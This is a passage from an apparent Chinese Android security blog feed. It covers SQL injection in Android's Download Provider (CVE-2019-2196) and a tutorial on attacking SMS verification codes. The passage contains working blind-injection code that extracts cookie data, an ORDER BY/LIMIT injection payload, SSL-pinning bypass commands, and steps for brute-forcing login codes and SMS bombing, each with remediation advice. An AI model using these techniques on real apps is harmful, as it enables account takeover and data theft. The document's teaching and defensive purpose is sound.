&quot;</span>).append(rowDescription);</span><br><span class="line"></span><br><span class="line">                   <span class="keyword">if</span> (dumpProtectedColumns) &#123;</span><br><span class="line">                       <span class="type">int</span> <span class="variable">uid</span> <span class="operator">=</span> binarySearch(rowId, <span class="string">&quot;uid&quot;</span>);</span><br><span class="line">                       sb.append(<span class="string">&quot;\nUID: &quot;</span>).append(uid);</span><br><span class="line"></span><br><span class="line">                       dumpColumn(rowId, <span class="string">&quot;CookieData&quot;</span>, sb);</span><br><span class="line">                       dumpColumn(rowId, <span class="string">&quot;ETag&quot;</span>, sb);</span><br><span class="line">                   &#125;</span><br><span class="line"></span><br><span class="line">                   Log.w(<span class="string">&quot;WindXaa&quot;</span>,sb.toString());</span><br><span class="line">               &#125;</span><br><span class="line">               Log.e(<span class="string">&quot;WindXaa&quot;</span>,<span class="string">&quot;\n\nDUMP FINISHED&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (cur != <span class="literal">null</span>)</span><br><span class="line">               cur.close();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dumpColumn</span><span class="params">(<span class="type">int</span> rowId, String columnName, StringBuilder sb)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (isTrueCondition(rowId, <span class="string">&quot;length(&quot;</span> + columnName + <span class="string">&quot;) &gt; 0&quot;</span>)) &#123;</span><br><span class="line">           <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> binarySearch(rowId, <span class="string">&quot;length(&quot;</span> + columnName + <span class="string">&quot;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">           sb.append(<span class="string">&quot;\n&quot;</span> + columnName + <span class="string">&quot;: &quot;</span>);</span><br><span class="line">           <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= len; i++) &#123;</span><br><span class="line">               <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> binarySearch(rowId, <span class="string">&quot;unicode(substr(&quot;</span> + columnName + <span class="string">&quot;,&quot;</span> + i + <span class="string">&quot;,1))&quot;</span>);</span><br><span class="line">               <span class="type">String</span> <span class="variable">newChar</span> <span class="operator">=</span> Character.toString((<span class="type">char</span>) c);</span><br><span class="line">               sb.append(newChar);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">binarySearch</span><span class="params">(<span class="type">int</span> id, String sqlExpression)</span> &#123;</span><br><span class="line">       <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">       <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">20000</span>;</span><br><span class="line">       <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">while</span> (min + <span class="number">1</span> &lt; max) &#123;</span><br><span class="line">           mid = (<span class="type">int</span>) Math.floor((<span class="type">double</span>) (max + min) / <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (isTrueCondition(id, sqlExpression + <span class="string">&quot;&gt;&quot;</span> + mid))</span><br><span class="line">               min = mid;</span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">               max = mid;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> ((mid == max) &amp;&amp; isTrueCondition(id, sqlExpression + <span class="string">&quot;=&quot;</span> + mid))</span><br><span class="line">           <span class="keyword">return</span> mid;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span> (isTrueCondition(id, sqlExpression + <span class="string">&quot;=&quot;</span> + (mid + <span class="number">1</span>))) <span class="comment">// Extra check</span></span><br><span class="line">           <span class="keyword">return</span> mid + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isTrueCondition</span><span class="params">(<span class="type">int</span> rowId, String sqlCondition)</span> &#123;</span><br><span class="line">       <span class="type">ContentResolver</span> <span class="variable">res</span> <span class="operator">=</span> getContentResolver();</span><br><span class="line">       <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://downloads/public_downloads/0&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="type">Cursor</span> <span class="variable">cur</span> <span class="operator">=</span> res.query(uri, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;_id&quot;</span>&#125;, <span class="string">&quot;_id=&quot;</span> + rowId + <span class="string">&quot;) and (&quot;</span> +</span><br><span class="line">               sqlCondition + <span class="string">&quot;) or (1=1&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> (cur != <span class="literal">null</span> &amp;&amp; cur.getCount() &gt; <span class="number">0</span>);</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (cur != <span class="literal">null</span>)</span><br><span class="line">               cur.close();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>预期效果显示（这里由于没找到合适案例，使用官方图片展示效果）：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/40.png" alt="image-20220710195237128"></p><h4 id="（3）安全防护"><a href="#（3）安全防护" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">如果它没有破坏任何功能，请考虑添加被删除的行：</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">query</span><span class="params">(<span class="keyword">final</span> Uri uri, String[] projection,</span></span><br><span class="line"><span class="params">    <span class="keyword">final</span> String selection, <span class="keyword">final</span> String[] selectionArgs,</span></span><br><span class="line"><span class="params">    <span class="keyword">final</span> String sort)</span> &#123;</span><br><span class="line">Helpers.validateSelection(selection, sAppReadableColumnsSet);</span><br></pre></td></tr></table></figure><h3 id="2-Android-Download-Provider上的SQL注入——sort参数（CVE-2019-2196）"><a href="#2-Android-Download-Provider上的SQL注入——sort参数（CVE-2019-2196）" class="headerlink" title="2.Android Download Provider上的SQL注入——sort参数（CVE-2019-2196）"></a>2.Android Download Provider上的SQL注入——sort参数（CVE-2019-2196）</h3><h4 id="（1）漏洞原理-4"><a href="#（1）漏洞原理-4" class="headerlink" title="（1）漏洞原理"></a>（1）漏洞原理</h4><p>同样是针对Download Provider，因为被授予<code>android.permission.INTERNET</code>权限的恶意应用可以在<code>query()</code>方法的<code>sort</code>参数（<code>ORDER BY</code>子句）中附加一个包含子查询语句的<code>LIMIT</code>子句，实施SQL注入攻击，从而检索Download Provider内部数据库的所有条目。</p><h4 id="（2）漏洞复现-4"><a href="#（2）漏洞复现-4" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>可以构造sql注入语句：</p><p><code>sort</code>参数传入的值是<code>ORDER BY</code>子句后拼接的内容，为了利用此漏洞，可以在<code>sort</code>参数处构造：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">columnName</span><br><span class="line">limit</span><br><span class="line"><span class="keyword">case</span> <span class="title function_">when</span> <span class="params">(condition)</span> then <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> end</span><br><span class="line">例如：</span><br><span class="line">_id limit <span class="keyword">case</span> <span class="title function_">when</span><span class="params">(</span></span><br><span class="line"><span class="params">    (select count(*)</span> from downloads)&gt;<span class="number">0</span></span><br><span class="line">)</span><br><span class="line">then <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> end</span><br></pre></td></tr></table></figure><p>这里详细的复现过程可以参考文章：<a href="https://zhuanlan.zhihu.com/p/367365614">Android Download Provider上的SQL注入——sort参数（CVE-2019-2196）</a></p><h4 id="（3）安全防护-1"><a href="#（3）安全防护-1" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><p>确保执行数据库操作前合理校验query()方法的sort参数。例如，确保sort参数不包含注入了LIMIT子句和潜在的恶意子查询语句的恶意payload，或者执行更严格的校验，比如要求参数仅包含以逗号分隔的现有数据列列表和字符串“asc”或“desc”。</p><p>DownloadProvider.java文件添加代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Cursor <span class="title function_">query</span><span class="params">(<span class="keyword">final</span> Uri uri, String[] projection,</span></span><br><span class="line"><span class="params">         <span class="keyword">final</span> String selection, <span class="keyword">final</span> String[] selectionArgs,</span></span><br><span class="line"><span class="params">         <span class="keyword">final</span> String sort)</span> &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (shouldRestrictVisibility()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (sort != <span class="literal">null</span> &amp;&amp; sort.toLowerCase(Locale.ENGLISH).contains(<span class="string">&quot;limit&quot;</span>))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;invalid sort&quot;</span>);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>本文通过总结和学习，初步的将讲解了Android平台APP上的常见的Sql注入的方式，并使用一些案例进行了一一的列举，文中一部分漏洞没有找到合适的案例，大家可以参考对应作者的博客，后续相关的实验材料上传github和知识星球</p><p>github网址：<a href="https://github.com/WindXaa/Android-Vulnerability-Mining">WindXaa</a></p><h2 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h2><p>sql注入漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/li-xin-yi/SQL-inject-demo</span><br><span class="line">https://security-summer-labs.readthedocs.io/en/latest/lab8/readme.html#task-1-sql-injection-attack-on-select-statement</span><br><span class="line">https://chowdera.com/2022/02/202202060538187242.html</span><br><span class="line">https://ioactive.com/multiple-vulnerabilities-in-androids-download-provider-cve-2018-9468-cve-2018-9493-cve-2018-9546/</span><br><span class="line">https://cloud.tencent.com/developer/article/1580824</span><br></pre></td></tr></table></figure><p>DownLoad Provider漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://zhuanlan.zhihu.com/p/367365614</span><br><span class="line">https://mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</span><br><span class="line">https://ioactive.com/multiple-vulnerabilities-in-androids-download-provider-cve-2018-9468-cve-2018-9493-cve-2018-9546/</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;最近一直很忙碌，即将进入本系列文章基础篇的最后几个篇章，本文主要讲述Android中存在的常见的SQL注入漏洞的方式，以及如何快速的挖掘SQL注入漏洞。&lt;/p&gt;</summary>
    
    
    
    <category term="Android APP漏洞之战" scheme="http://security-kitchen.com/categories/Android-APP%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%88%98/"/>
    
    
    <category term="漏洞挖掘" scheme="http://security-kitchen.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="工具" scheme="http://security-kitchen.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Android App漏洞之战（17）——验证码漏洞挖掘详解</title>
    <link href="http://security-kitchen.com/2023/02/14/bug0017/"/>
    <id>http://security-kitchen.com/2023/02/14/bug0017/</id>
    <published>2023-02-14T01:04:19.000Z</published>
    <updated>2023-12-23T09:13:44.113Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>验证码漏洞也是当下十分常见的APP端漏洞，本文对验证码漏洞原理做了一个初步的讲解，并复现了当下一些常见的验证码相关的漏洞，本文App抓包技术参考了肉丝大佬的书籍安卓Frida逆向和抓包实战</p><span id="more"></span><p>本文第二节主要讲述Android APP端抓包的基础知识</p><p>本文第三节主要讲述APP验证码漏洞的种类和安全场景</p><p>本文第四节主要讲述APP验证码原理，并复现了一些常见的验证码相关漏洞</p><h2 id="二、基础知识"><a href="#二、基础知识" class="headerlink" title="二、基础知识"></a>二、基础知识</h2><p>APP验证码漏洞挖掘，需要掌握基本的Android抓包技术，现在越来越多的APP开始进行安全防护，所以如何才能绕过一些基本的防护技术，合理的抓取到报文是验证码漏洞挖掘的先决条件。学习下面知识之前，可以先学习<a href="https://bbs.pediy.com/thread-270634.htm">Android APP漏洞之战（6）——HTTP&#x2F;HTTPs通信漏洞详解</a>的基础理论知识。</p><h3 id="1-APP抓包技术详解"><a href="#1-APP抓包技术详解" class="headerlink" title="1.APP抓包技术详解"></a>1.APP抓包技术详解</h3><h4 id="（1）高版本android系统证书导入"><a href="#（1）高版本android系统证书导入" class="headerlink" title="（1）高版本android系统证书导入"></a>（1）高版本android系统证书导入</h4><p><strong>Android4.4后</strong></p><p>开始引入CA证书校验机制，这里先会涉及到Https的单向认证机制</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/1.png"></p><p>上述步骤4就进行证书校验的环节，而这里的证书便是将手机内置的证书和客户端的证书进行校验，来判断是否合法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Https原理：非对称+对称连接</span><br><span class="line">（1）非对称主要是为了传输对称连接所需要密钥和证书校验</span><br><span class="line">（2）对称连接是加密密码可以安全传输，就可以采用对称连接</span><br></pre></td></tr></table></figure><p><strong>Android4.4-Android7.0</strong></p><p>这个阶段，Android系统信任用户下的证书，所以逆向人员可以将抓包工具的证书导入用户目录下，实现对Https的报文抓取，这里案例可以参考<a href="https://bbs.pediy.com/thread-268445.htm">Android协议分析（一）——Fiddler安装和使用 </a></p><p><strong>Android7.0+</strong></p><p>Android7.0后，Android系统不再信任用户目录下证书，只信任根目录下证书，所以我们要获取HTTPs报文，需要将抓包工具的证书移动到根目录下</p><p>方法一：将文件系统先挂载起来，然后移动</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root权限下：</span><br><span class="line">mount -o remount,rw /system</span><br><span class="line">cp * /etc/security/cacerts/</span><br><span class="line">chmod <span class="number">777</span> /etc/security/cacerts<span class="comment">/*</span></span><br><span class="line"><span class="comment">mount -o remount,ro /system</span></span><br><span class="line"><span class="comment">reboot</span></span><br></pre></td></tr></table></figure><p>方法二：使用Magisk证书模块</p><p><a href="https://github.com/Magisk-Modules-Repo/movecert">Move Certificates</a></p><p>我们只需要将模块安装到Magisk中，这样就可以成功的抓取常规状态下的HTTPs的报文了，这里一定主要抓包时必须保证Android手机时间要正确，否则也会报错</p><h4 id="（2）HTTPs双向认证及解决方案"><a href="#（2）HTTPs双向认证及解决方案" class="headerlink" title="（2）HTTPs双向认证及解决方案"></a>（2）HTTPs双向认证及解决方案</h4><p>Https一般采用单向认证，但是一些特殊的APP在服务端也会对证书进行再次认证，这样的认证机制我们称为HTTPs双向认证</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/2.png"></p><p>上图中步骤5就对客户端证书进行了校验，这里导致我们就算客户端导入了抓包工具的证书并信任，也无法通过服务端的认证</p><p><strong>解决办法：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）获取客户端的证书，可以通过编写hook脚本的方式，获取客户端证书及密码</span><br><span class="line">（2）将客户端证书导入到抓包软件charles中，使得Charles能都获取服务端信任（这里一般可以使用charles、Burpsuit软件）</span><br></pre></td></tr></table></figure><p>方法一：</p><p>这里我们一般可以先去分析开发中进行保护的函数，再对对应的函数进行hook</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如java.security.KeyStore</span><br></pre></td></tr></table></figure><p>这里可以参考肉丝大佬的文章<a href="https://www.anquanke.com/post/id/197657#h3-11">实用FRIDA进阶：内存漫游、hook anywhere、抓包</a></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/3.png"></p><p>这里考虑篇幅问题，给一个参考的实操案例<a href="https://ch3nye.top/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E6%9F%90%E4%BA%A4%E5%8F%8Bapp%E7%9A%84%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81crack/">某交友app的双向认证crack</a></p><p>方法二：</p><p>直接在Apk文件下搜索.p12后缀的文件，这里搜索出来的很有可能就是证书文件，当然有些需要密码的就还是要进行hook了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tree -NCfhl |grep -i p12</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/4.png" alt="image-20220409205835643"></p><h4 id="（3）VPN代理机制"><a href="#（3）VPN代理机制" class="headerlink" title="（3）VPN代理机制"></a>（3）VPN代理机制</h4><p>如果APP中编写了检测代理抓包软件代码，也可能会导致我们抓不到包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.getProperty(“http.proxyHost”); </span><br><span class="line">System.getProperty(“http.proxyPort”); </span><br></pre></td></tr></table></figure><p>这样我们使用代理软件进行抓包要更加合适，当然也有一些检测VPN的情况，这种直接hook就可以了</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/5.png" alt="image-20220410094013590"></p><p>具体如何配置使用，可以参考这篇文章<a href="https://mp.weixin.qq.com/s/ahPbBSfkkBsv4oy265rI2Q">APP流量 “一个都不能少” ！</a></p><p>采用VPN代理进行抓包，和Http中间人抓包有本质区别，VPN抓包本质在网络层和路由层抓包</p><h4 id="（4）SSL-pinning"><a href="#（4）SSL-pinning" class="headerlink" title="（4）SSL pinning"></a>（4）SSL pinning</h4><p>就算我们使用Vpn代理抓包，也解决了证书双向认证的问题，但是在抓包过程中也可能会遇到证书绑定的情况</p><p>证书绑定：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">APP在代码段中有有对服务端证书进行对比一致性，如果发现是中间人就会直接终止连接</span><br></pre></td></tr></table></figure><p>这里我们提供一般的解决思路：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（1）识别证书绑定</span><br><span class="line">（2）先使用开源框架objection或DroidSSLUnpinning先去简单hook</span><br><span class="line">（3）不成功，再去分析APP使用哪种开发框架，去有针对性的进行hook</span><br><span class="line">（4）如果不知道开发框架，可以采用Hook Java的File构造函数进一步去定位证书绑定代码</span><br></pre></td></tr></table></figure><p>这里用一个简单的实例来说明：</p><p><strong>识别证书绑定：</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/6.png" alt="image-20220410095914907"></p><p>当我们解决了单向认证、双向认证、采用代理通信还出现上面的情况，说明APP可能采用了证书绑定</p><p><strong>使用开源框架hook——以objection为例：</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/7.png" alt="image-20220410095914907"></p><p>我们直接使用objection的hook或spwan模式就进行证书绑定hook</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hook模式启动：android sslpinning disable</span><br><span class="line">spwan模式启动：objection -g 包名 explore -s &quot;android sslpinning disable&quot;</span><br></pre></td></tr></table></figure><p><strong>针对开发框架，有针对性hook:</strong></p><p>我们需要分析APP采用何种开源框架，如okhttp等，不过这里一般开源hook工具objection已经针对了当下的很多开源框架了，所以如果没有成功，可能是程序进行了混淆，这个时候就需要进一步去hook正确的绑定函数</p><p><strong>未知开源框架：</strong></p><p>我们对File构造函数进行hook，然后可以观察对应的调用链信息，从而分析出证书绑定的函数</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/8.png" alt="image-20220410095914907"></p><p>再针对这里找到的函数进行正确的hook，即可</p><h4 id="（5）VPN-Charles-Burpsuit环境配置"><a href="#（5）VPN-Charles-Burpsuit环境配置" class="headerlink" title="（5）VPN+Charles+Burpsuit环境配置"></a>（5）VPN+Charles+Burpsuit环境配置</h4><p>我们经过上面一系列流程基本可以解决当下常见的安全防护形式，当然针对更加安全的抓包防护策略就需要深入的解决了，这里我们介绍一下本文的抓包环境搭建，一般使用通过VPN+Charles+Burpsuit的组合抓包方式</p><p>首先先配置VPN+Charles的抓包模式</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/9.png" alt="image-20220410101546946"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/10.png" alt="image-20220410101609229"></p><p>然后我们将Charles的流量去导入到Burpsuit中，这样就可以实现组合使用，当然根据实际情况你也可以选择合适抓包工具</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/11.png" alt="image-20220410102252123"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/12.png" alt="image-20220410102431749"></p><h2 id="三、验证码漏洞安全场景和分类"><a href="#三、验证码漏洞安全场景和分类" class="headerlink" title="三、验证码漏洞安全场景和分类"></a>三、验证码漏洞安全场景和分类</h2><h3 id="1-验证码漏洞安全场景"><a href="#1-验证码漏洞安全场景" class="headerlink" title="1.验证码漏洞安全场景"></a>1.验证码漏洞安全场景</h3><p>验证码漏洞一般是APP对验证码没有进行登陆校验等安全防护导致的，攻击者一般可以利用验证码漏洞进行暴力破解实现任意号码登陆、还可以实现短信轰炸、导致验证码泄露、手机号换绑、验证码无限发送风险、万能验证码登录、修改返回包绕过验证码登录等安全问题，验证码漏洞在APP中的影响十分严重，一般会造成严重的经济损失。</p><h3 id="2-验证码漏洞分类"><a href="#2-验证码漏洞分类" class="headerlink" title="2.验证码漏洞分类"></a>2.验证码漏洞分类</h3><p>我们根据上面的描述，可以将验证码漏洞分为如下几类：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/45.png" alt="image-20220411111532796"></p><h2 id="四、验证码漏洞原理分析和复现"><a href="#四、验证码漏洞原理分析和复现" class="headerlink" title="四、验证码漏洞原理分析和复现"></a>四、验证码漏洞原理分析和复现</h2><h3 id="1-验证码暴力破解漏洞"><a href="#1-验证码暴力破解漏洞" class="headerlink" title="1.验证码暴力破解漏洞"></a>1.验证码暴力破解漏洞</h3><h4 id="（1）原理分析"><a href="#（1）原理分析" class="headerlink" title="（1）原理分析"></a>（1）原理分析</h4><p>验证码暴力破解漏洞一般是因为用户使用手机号+验证码的方式进行登陆时，短信验证码一般由4-6位数字组成，而且APP并未对验证码做时间和失败次数校验，所以攻击者可以通过这个区间的所有数字进行暴力破解来进行攻击</p><h4 id="（2）漏洞复现"><a href="#（2）漏洞复现" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>案例：XX APP为例</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/14.png" alt="image-20220410105515919"></p><p>我们打开APP，发现该APP并未对登录号码进行验证，而且返回的验证码是4位验证码，这里我们就十分怀疑是否能进行验证码暴力破解</p><p>然后我们使用上面搭建好的抓包环境，随便输入一个验证码去抓取错误信息</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/15.png" alt="image-20220410105515919"></p><p>我们发现APP根本没有进行证书绑定等安全防护，甚至没对验证码进行加密，我们于是对响应的报文进行攻击</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/16.png" alt="image-20220410105515919"></p><p>然后我们采用100个线程，就暴力破解</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/17.png" alt="image-20220410105515919"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/18.png" alt="image-20220410105515919"></p><p>开始攻击</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/19.png" alt="image-20220410105515919"></p><p>然后我们就成功暴力破解出验证码，这里我们发现还可以输入任意的号码<code>18888888888</code>同样可以成功登录，而且可以获取其他用户的订单信息</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/20.png" alt="image-20220410110251127"></p><p>最后类似漏洞危害，如下</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/21.png" alt="image-20220410110705360"></p><h4 id="（3）安全防护"><a href="#（3）安全防护" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）设置验证码时间验证，一般建议为180s</span><br><span class="line">（2）限制单位时间内验证码失败的尝试错误，如5分钟连续失败即锁定账号</span><br><span class="line">（3）对验证码进行加密传输</span><br></pre></td></tr></table></figure><h3 id="2-验证码无限次数发送（短信轰炸）"><a href="#2-验证码无限次数发送（短信轰炸）" class="headerlink" title="2.验证码无限次数发送（短信轰炸）"></a>2.验证码无限次数发送（短信轰炸）</h3><h4 id="（1）原理分析-1"><a href="#（1）原理分析-1" class="headerlink" title="（1）原理分析"></a>（1）原理分析</h4><p>验证码无限次数发送、短信轰炸漏洞一般是APP端并没有对手机号码进行次数显示，也未对访问进行时间限制</p><h4 id="（2）漏洞复现-1"><a href="#（2）漏洞复现-1" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>我们首先对上面的APP进行发送验证码，查看响应的报文</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/22.png" alt="image-20220410111915010"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/26.png" alt="image-20220411101714278"></p><p>然后通过暴力破解进行短信轰炸，这里轰炸自己手机号，就轰炸个50次吧</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/24.png" alt="image-20220410112221486"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/25.png" alt="image-20220410112415310"></p><p>我们发现可以验证码无限次数发送，但是无法进行短信轰炸，因为验证码做了60s校验，于是尝试去分析APP代码</p><p>我们将APP拖入GDA分析</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/27.png" alt="image-20220411102019374"></p><p>这里我们发现APP进行360加固保护，我们就使用一代壳脱壳工具Frida_Dump进行脱壳</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/28.png" alt="image-20220411102212716"></p><p>我们定位到相关的代码段:</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/29.png" alt="image-20220411102327963"></p><p>分析了代码逻辑，本来以为可以简单的hook相关的函数，使得验证码60s时间变少，但是发现成功发送后还是显示需要60s后再次发送，这说明这个验证就是根据发送的报文，在服务端进行校验</p><p>我们查看发送的报文：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/30.png" alt="image-20220411104546386"></p><p>我们发现获取验证码就是对应的手机号和time值，很显然我们推测time值是用来校验时间和对应手机号的</p><p>我们分析对应源码：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/31.png" alt="image-20220411104714014"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/32.png" alt="image-20220411104815174"></p><p>我们可以清晰发现为什么APP验证码对当前系统时间进行校验，因为有系统时间获取函数</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/33.png" 